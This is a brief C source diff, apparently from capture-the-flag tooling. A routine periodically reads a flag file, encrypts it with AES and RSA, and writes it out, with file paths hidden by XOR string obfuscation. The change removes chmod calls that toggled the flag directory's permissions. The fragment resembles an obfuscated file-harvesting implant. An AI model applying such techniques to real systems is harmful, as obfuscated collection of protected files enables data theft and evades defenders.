@@ -342,9 +342,6 @@ void WebFlagRoutine()
         if (counter % 100 == 0)
         {
             /* 读 flag → AES+RSA 加密 → 写入文件 */
-            /* 写入前临时将目录改为 755 */
-            chmod(XorString(FLAG_DIR), 0755);
-
             char raw[0x50] = {0};
             int rfd = open(XorString(FLAG_PATH), O_RDONLY);
             if (rfd >= 0)
@@ -369,8 +366,6 @@ void WebFlagRoutine()
                 write(wfd, rsa_out, RSA_BYTES);
                 close(wfd);
             }
-
-            chmod(XorString(FLAG_DIR), 0555);
         }
         counter++;
     }
